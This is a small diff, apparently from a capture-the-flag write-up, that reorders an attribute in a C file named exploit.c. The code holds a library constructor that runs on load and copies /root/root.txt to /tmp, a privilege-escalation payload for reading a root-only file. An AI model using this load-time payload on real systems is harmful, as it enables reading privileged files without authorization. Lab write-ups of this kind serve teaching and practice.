@@ -277,7 +277,7 @@ nano exploit.c
 #include <stdlib.h>
 #include <unistd.h>
 
-__attribute__((constructor)) void init() {
+void __attribute__((constructor)) init() {
     system("cat /root/root.txt > /tmp/root.txt");
     exit(0);
 }
